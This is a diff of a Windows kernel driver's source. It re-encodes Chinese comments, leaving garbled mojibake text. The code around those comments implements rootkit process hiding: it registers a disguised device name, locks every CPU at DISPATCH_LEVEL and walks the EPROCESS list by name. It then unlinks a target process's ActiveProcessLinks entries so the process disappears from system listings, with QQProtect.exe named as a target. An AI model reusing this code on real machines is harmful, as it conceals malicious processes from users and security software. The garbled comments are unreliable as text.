@@ -776,17 +782,17 @@ void TestCommand(PVOID inputBuffer, PVOID outputBuffer, ULONG inputBufferLength,
 }
 
 
-// ÔÚ windows 7 ÄÚºËÖĞ£¬OS µÄ _EPROCESS.ImageFileName[] Êı×é³¤¶ÈÎª15×Ö½Ú£¬³¬¹ıµÄ²¿·Ö»á±»½Ø¶Ï£¬
-	//ÇÒOS »á×ÔĞĞ°Ñ _EPROCESS.ImageFileName[14]Ìî³äÎª\0£¬ËùÒÔ²»ĞèÒªÓÃµ½´Ëº¯Êı
+// åœ¨ windows 7 å†…æ ¸ä¸­ï¼ŒOS çš„ _EPROCESS.ImageFileName[] æ•°ç»„é•¿åº¦ä¸º15å­—èŠ‚ï¼Œè¶…è¿‡çš„éƒ¨åˆ†ä¼šè¢«æˆªæ–­ï¼Œ
+	//ä¸”OS ä¼šè‡ªè¡ŒæŠŠ _EPROCESS.ImageFileName[14]å¡«å……ä¸º\0ï¼Œæ‰€ä»¥ä¸éœ€è¦ç”¨åˆ°æ­¤å‡½æ•°
 
 /*void  getProcessName(char  *dest, char  *src){
 	
 
 	//		BYTE					BYTE*
-	// dest:processName   src: (currentEPROCESSpointer + EPROCESS_OFFSET_NAME) ½ø³ÌÓ³ÏñÃû£¬¸´ÖÆ³¤¶ÈÎª16×Ö½Ú 
+	// dest:processName   src: (currentEPROCESSpointer + EPROCESS_OFFSET_NAME) è¿›ç¨‹æ˜ åƒåï¼Œå¤åˆ¶é•¿åº¦ä¸º16å­—èŠ‚ 
 	strncpy(dest, src, SZ_EPROCESS_NAME);
 
-	// ×îºóÒ»¸öÔªËØ£¨16-1=15£©Îª±íÊ¾×Ö·û´®½áÎ²µÄ\0 ×Ö·û
+	// æœ€åä¸€ä¸ªå…ƒç´ ï¼ˆ16-1=15ï¼‰ä¸ºè¡¨ç¤ºå­—ç¬¦ä¸²ç»“å°¾çš„\0 å­—ç¬¦
 	dest[SZ_EPROCESS_NAME - 1] = '\0';
 
 	return;
@@ -797,11 +803,11 @@ NTSTATUS RegisterDriverDeviceName(IN PDRIVER_OBJECT DriverObject)
 {
 	NTSTATUS ntStatus;
 	UNICODE_STRING name_String;
-	/* ÀûÓÃDeviceNameBufferÀ´³õÊ¼»¯name_String */
+	/* åˆ©ç”¨DeviceNameBufferæ¥åˆå§‹åŒ–name_String */
 	RtlInitUnicodeString(&name_String, DeviceNameBuffer);
 	/*
-	* ´´½¨Ò»¸öÉè±¸£¬Éè±¸ÀàĞÍÎªFILE_DEVICE_RK£¨ÓÉÎÒÃÇ×Ô¼ºÔÚctrlcode.hÖĞ¶¨Òå)£¬
-	* ´´½¨µÄÉè±¸±£´æÔÚMSNetDiagDeviceObjectÖĞ
+	* åˆ›å»ºä¸€ä¸ªè®¾å¤‡ï¼Œè®¾å¤‡ç±»å‹ä¸ºFILE_DEVICE_RKï¼ˆç”±æˆ‘ä»¬è‡ªå·±åœ¨ctrlcode.hä¸­å®šä¹‰)ï¼Œ
+	* åˆ›å»ºçš„è®¾å¤‡ä¿å­˜åœ¨MSNetDiagDeviceObjectä¸­
 	*/
 	ntStatus = IoCreateDevice
 	(
@@ -825,9 +831,9 @@ NTSTATUS RegisterDriverDeviceLink()
 	RtlInitUnicodeString(&device_String, DeviceNameBuffer);
 	RtlInitUnicodeString(&unicodeLinkString, DeviceLinkBuffer);
 	/*
-	* IoCreateSymbolicLink´´½¨Ò»¸öÉè±¸Á´½Ó¡£Çı¶¯³ÌĞòÖĞËäÈ»×¢²áÁËÉè±¸£¬
-	* µ«ËüÖ»ÄÜÔÚÄÚºËÖĞ¿É¼û£¬ÎªÁËÊ¹Ó¦ÓÃ³ÌĞò¿É¼û£¬Çı¶¯ĞèÓ´°¡±©Â¶Ò»¸ö·ûºÅ
-	* Á´½Ó£¬¸ÃÁ´½ÓÖ¸ÏòÕæÕıµÄÉè±¸Ãû
+	* IoCreateSymbolicLinkåˆ›å»ºä¸€ä¸ªè®¾å¤‡é“¾æ¥ã€‚é©±åŠ¨ç¨‹åºä¸­è™½ç„¶æ³¨å†Œäº†è®¾å¤‡ï¼Œ
+	* ä½†å®ƒåªèƒ½åœ¨å†…æ ¸ä¸­å¯è§ï¼Œä¸ºäº†ä½¿åº”ç”¨ç¨‹åºå¯è§ï¼Œé©±åŠ¨éœ€å“Ÿå•Šæš´éœ²ä¸€ä¸ªç¬¦å·
+	* é“¾æ¥ï¼Œè¯¥é“¾æ¥æŒ‡å‘çœŸæ­£çš„è®¾å¤‡å
 	*/
 	ntStatus = IoCreateSymbolicLink
 	(
@@ -838,7 +844,7 @@ NTSTATUS RegisterDriverDeviceLink()
 }
 
 
-//ÏÂÃæÕâĞ©º¯ÊıÓÃÓÚÔÚSMPÏµÍ³ÉÏÍ¬²½¶ÔWindowsÄÚºË×ÊÔ´µÄ·ÃÎÊ£¬ËüÃÇÒªÃ´Ö±½Ó»ò¼ä½ÓÔÚ HideProcess() ÖĞ±»µ÷ÓÃ£º
+//ä¸‹é¢è¿™äº›å‡½æ•°ç”¨äºåœ¨SMPç³»ç»Ÿä¸ŠåŒæ­¥å¯¹Windowså†…æ ¸èµ„æºçš„è®¿é—®ï¼Œå®ƒä»¬è¦ä¹ˆç›´æ¥æˆ–é—´æ¥åœ¨ HideProcess() ä¸­è¢«è°ƒç”¨ï¼š
 
 KIRQL  RaiseIRQL() {
 	KIRQL  curr;
@@ -863,9 +869,9 @@ PKDPC  AcquireLock() {
 	DBG_TRACE("AcquireLock", "current cpu Executing at IRQL == DISPATCH_LEVEL");
 	InterlockedAnd(&has_finished_access_os_res, 0);
 	InterlockedAnd(&nCPUsLocked, 0);
-	DBG_PRINT2("[AcquireLock]:  CPUs number = %u\n", KeNumberProcessors);// %u:  ÎŞ·ûºÅÊ®½øÖÆÕûÊı¡£
+	DBG_PRINT2("[AcquireLock]:  CPUs number = %u\n", KeNumberProcessors);// %u:  æ— ç¬¦å·åè¿›åˆ¶æ•´æ•°ã€‚
 
-														    //´Ë´¦µÄ ExAllocatePoolWithTag() µ÷ÓÃÓï¾äµÄ²ÎÊı²¿·ÖĞèÒª»»ĞĞÊéĞ´£¬·ñÔòÓÉÓÚÎ´ÖªÔ­Òò£¬»á±¨´í¸Ãº¯ÊıÎ´¶¨Òå
+														    //æ­¤å¤„çš„ ExAllocatePoolWithTag() è°ƒç”¨è¯­å¥çš„å‚æ•°éƒ¨åˆ†éœ€è¦æ¢è¡Œä¹¦å†™ï¼Œå¦åˆ™ç”±äºæœªçŸ¥åŸå› ï¼Œä¼šæŠ¥é”™è¯¥å‡½æ•°æœªå®šä¹‰
 	dpcArray = (PKDPC)ExAllocatePoolWithTag(NonPagedPool,
 		KeNumberProcessors * sizeof(KDPC), 0xABCD);
 	if (dpcArray == NULL) {
@@ -970,8 +976,8 @@ void  WalkProcessListWithName(unsigned char* trg_proc_nme){
 
 	target_proc_name = current_proc_name;
 
-	/*Èç¹ûstricmp ÏµÁĞÀı³Ì¾«È·ÒªÇó±È½ÏÁ½¸öÒÔ\0½áÎ²µÄ×Ö·û´®£¬ÔòĞèÒªµ±Ç°°Ñ»ñÈ¡µ½µÄ½ø³ÌÃû¸´ÖÆµ½±¾µØÊı×éÄÚ£¬È»ºóÉèÖÃ×îºóÒ»¸ö
-	×Ö·ûÎª\0£¬ÔÙÓëÓ²±àÂëµÄ\0½áÎ²È«¾Ö×Ö·û´®£¨QQProtect.exe\0£©±È½Ï*/
+	/*å¦‚æœstricmp ç³»åˆ—ä¾‹ç¨‹ç²¾ç¡®è¦æ±‚æ¯”è¾ƒä¸¤ä¸ªä»¥\0ç»“å°¾çš„å­—ç¬¦ä¸²ï¼Œåˆ™éœ€è¦å½“å‰æŠŠè·å–åˆ°çš„è¿›ç¨‹åå¤åˆ¶åˆ°æœ¬åœ°æ•°ç»„å†…ï¼Œç„¶åè®¾ç½®æœ€åä¸€ä¸ª
+	å­—ç¬¦ä¸º\0ï¼Œå†ä¸ç¡¬ç¼–ç çš„\0ç»“å°¾å…¨å±€å­—ç¬¦ä¸²ï¼ˆQQProtect.exe\0ï¼‰æ¯”è¾ƒ*/
 
 	//getProcessName(processName, current_proc_name);
 
@@ -997,16 +1003,16 @@ void  WalkProcessListWithName(unsigned char* trg_proc_nme){
 	currentEPROCESSpointer = nextEPROCESSpointer;
 	current_proc_name = get_proc_name(currentEPROCESSpointer);
 
-// ´úÂëÖ´ĞĞµ½´Ë´¦£¬current_proc_name£ºÏÂÒ»¸ö½ø³ÌÃû³Æ
-//				target_proc_name£ºµ±Ç°½ø³ÌÃû³Æ
-//				nextEPROCESSpointer£ºÖ¸ÏòÏÂÒ»¸ö½ø³Ì
-//				currentEPROCESSpointer£ºÖ¸ÏòÏÂÒ»¸ö½ø³Ì
-// »­³ö´Ëº¯ÊıµÄÂß¼­Á÷³Ì
-// while Ñ­»·ÍË³öµÄÌõ¼şÊÇ£ºtarget_proc_name == current_proc_name£¬ÒòÎªÇ°ÃæµÄ´úÂëÂß¼­½« target_proc_name ³õÊ¼»¯Îªµ±Ç°Ö´ĞĞ½ø³ÌµÄÃû³Æ£¬
-//È»ºó±£³Ö²»±ä£¬²¢ÇÒµ±Ç°Ö´ĞĞ½ø³ÌµÄ EPROCESS ½á¹¹×÷ÎªÁ´±íÍ·£¬ÕâÑù target_proc_name ¾ÍÄÜ¹»±êÊ¶±íÍ·½ø³ÌÃû³Æ
-//ÁíÒ»·½Ãæ£¬¾Ö²¿±äÁ¿ current_proc_name ÔÚÃ¿Ò»´ÎÑ­»·µÄµü´úÖĞ¶¼±»¸üĞÂ£¬µ± current_proc_name µÈÓÚ target_proc_name Ê±£¬
-//ËµÃ÷±¾´Îµü´úµ½´ïÁËÁ´±íµÄ½áÎ²
-//£¨½áÎ²±íÏîµÄ LIST_ENTRY.Flink Ö¸Ïò±íÍ·µÄ LIST_ENTRY.Flink£©£¬¼´ current_proc_name ÔÙ´Î±»¸üĞÂÎª±íÍ·½ø³ÌµÄ PID Ê±£¬ÍË³öÑ­»·¡£
+// ä»£ç æ‰§è¡Œåˆ°æ­¤å¤„ï¼Œcurrent_proc_nameï¼šä¸‹ä¸€ä¸ªè¿›ç¨‹åç§°
+//				target_proc_nameï¼šå½“å‰è¿›ç¨‹åç§°
+//				nextEPROCESSpointerï¼šæŒ‡å‘ä¸‹ä¸€ä¸ªè¿›ç¨‹
+//				currentEPROCESSpointerï¼šæŒ‡å‘ä¸‹ä¸€ä¸ªè¿›ç¨‹
+// ç”»å‡ºæ­¤å‡½æ•°çš„é€»è¾‘æµç¨‹
+// while å¾ªç¯é€€å‡ºçš„æ¡ä»¶æ˜¯ï¼štarget_proc_name == current_proc_nameï¼Œå› ä¸ºå‰é¢çš„ä»£ç é€»è¾‘å°† target_proc_name åˆå§‹åŒ–ä¸ºå½“å‰æ‰§è¡Œè¿›ç¨‹çš„åç§°ï¼Œ
+//ç„¶åä¿æŒä¸å˜ï¼Œå¹¶ä¸”å½“å‰æ‰§è¡Œè¿›ç¨‹çš„ EPROCESS ç»“æ„ä½œä¸ºé“¾è¡¨å¤´ï¼Œè¿™æ · target_proc_name å°±èƒ½å¤Ÿæ ‡è¯†è¡¨å¤´è¿›ç¨‹åç§°
+//å¦ä¸€æ–¹é¢ï¼Œå±€éƒ¨å˜é‡ current_proc_name åœ¨æ¯ä¸€æ¬¡å¾ªç¯çš„è¿­ä»£ä¸­éƒ½è¢«æ›´æ–°ï¼Œå½“ current_proc_name ç­‰äº target_proc_name æ—¶ï¼Œ
+//è¯´æ˜æœ¬æ¬¡è¿­ä»£åˆ°è¾¾äº†é“¾è¡¨çš„ç»“å°¾
+//ï¼ˆç»“å°¾è¡¨é¡¹çš„ LIST_ENTRY.Flink æŒ‡å‘è¡¨å¤´çš„ LIST_ENTRY.Flinkï¼‰ï¼Œå³ current_proc_name å†æ¬¡è¢«æ›´æ–°ä¸ºè¡¨å¤´è¿›ç¨‹çš„ PID æ—¶ï¼Œé€€å‡ºå¾ªç¯ã€‚
 
 
 
@@ -1052,22 +1058,22 @@ void  adjustProcessListEntryWithProcName(BYTE*  currentEPROCESSpointer)
 	prevEPROCESSpointer = getPreviousEPROCESSpointerForProcName(currentEPROCESSpointer);
 	nextEPROCESSpointer = getNextEPROCESSpointerForProcName(currentEPROCESSpointer);
 
-//·Ö±ğÈ¡µÃµ±Ç°ºÍÏàÁÚµÄ 2 ¸ö ERROCESS µÄ ActiveProcessLinks ×Ö¶Î£¨Ò»¸ö LIST_ENTRY ¶ÔÏó£©
+//åˆ†åˆ«å–å¾—å½“å‰å’Œç›¸é‚»çš„ 2 ä¸ª ERROCESS çš„ ActiveProcessLinks å­—æ®µï¼ˆä¸€ä¸ª LIST_ENTRY å¯¹è±¡ï¼‰
 
 	currentListEntry = ((LIST_ENTRY*)(currentEPROCESSpointer + EPROCESS_OFFSET_LINKS));
 	prevListEntry = ((LIST_ENTRY*)(prevEPROCESSpointer + EPROCESS_OFFSET_LINKS));
 	nextListEntry = ((LIST_ENTRY*)(nextEPROCESSpointer + EPROCESS_OFFSET_LINKS));
 
-//·Ö±ğĞŞ¸ÄÈıÕßÖĞµÄÌØ¶¨×Ö¶Î£¨Flink »ò Blink£©£¬ÊµÏÖÒş²Øµ±Ç°µÄ ERROCESS
+//åˆ†åˆ«ä¿®æ”¹ä¸‰è€…ä¸­çš„ç‰¹å®šå­—æ®µï¼ˆFlink æˆ– Blinkï¼‰ï¼Œå®ç°éšè—å½“å‰çš„ ERROCESS
 
-//Ç°Ò»¸ö ERROCESS  µÄ ActiveProcessLinks.Flink Ö¸ÏòÏÂÒ»¸ö ERROCESS  µÄ ActiveProcessLinks.Flink
-//ÏÂÒ»¸ö ERROCESS  µÄ ActiveProcessLinks.Blink Ö¸ÏòÇ°Ò»¸ö ERROCESS  µÄ ActiveProcessLinks.Flink
-//Õâ¾ÍÈÆ¹ıÁËµ±Ç°£¨ÖĞ¼ä£©µÄ ERROCESS µÄ ActiveProcessLinks
+//å‰ä¸€ä¸ª ERROCESS  çš„ ActiveProcessLinks.Flink æŒ‡å‘ä¸‹ä¸€ä¸ª ERROCESS  çš„ ActiveProcessLinks.Flink
+//ä¸‹ä¸€ä¸ª ERROCESS  çš„ ActiveProcessLinks.Blink æŒ‡å‘å‰ä¸€ä¸ª ERROCESS  çš„ ActiveProcessLinks.Flink
+//è¿™å°±ç»•è¿‡äº†å½“å‰ï¼ˆä¸­é—´ï¼‰çš„ ERROCESS çš„ ActiveProcessLinks
 	(*prevListEntry).Flink = nextListEntry;
 	(*nextListEntry).Blink = prevListEntry;
 
-//µ±Ç° ERROCESS µÄ ActiveProcessLinks.Flink Óë ActiveProcessLinks.Blink Ö¸Ïò ActiveProcessLinks ×ÔÉí£¬
-//´ÓÁ´±íÖĞ·ÖÀë
+//å½“å‰ ERROCESS çš„ ActiveProcessLinks.Flink ä¸ ActiveProcessLinks.Blink æŒ‡å‘ ActiveProcessLinks è‡ªèº«ï¼Œ
+//ä»é“¾è¡¨ä¸­åˆ†ç¦»
 	(*currentListEntry).Flink = currentListEntry;
 	(*currentListEntry).Blink = currentListEntry;
 
@@ -1104,8 +1110,8 @@ unsigned char*  get_proc_name(BYTE*  currentEPROCESSpointer){
 	
 	unsigned char* proc_name;
 
-// _EPROCESS.ImageFileName ×Ö¶Î¾ÍÊÇÒ»¸ö UCHAR£¨Òà¼´ unsigned char£©ĞÍÊı×é£¬
-//ÔÚ NT5.2 °æÄÚºË£¨ÓÃÓÚwindows xp ,2003£©ÖĞ³¤¶È 16 ×Ö½Ú£¬ÔÚ NT6.2 °æÄÚºË£¨ÓÃÓÚwindows 7, 2008£©ÖĞ³¤¶È 15 ×Ö½Ú
+// _EPROCESS.ImageFileName å­—æ®µå°±æ˜¯ä¸€ä¸ª UCHARï¼ˆäº¦å³ unsigned charï¼‰å‹æ•°ç»„ï¼Œ
+//åœ¨ NT5.2 ç‰ˆå†…æ ¸ï¼ˆç”¨äºwindows xp ,2003ï¼‰ä¸­é•¿åº¦ 16 å­—èŠ‚ï¼Œåœ¨ NT6.2 ç‰ˆå†…æ ¸ï¼ˆç”¨äºwindows 7, 2008ï¼‰ä¸­é•¿åº¦ 15 å­—èŠ‚
 	proc_name = (unsigned char*)(currentEPROCESSpointer + EPROCESS_OFFSET_NAME);
 	return (proc_name);
 }
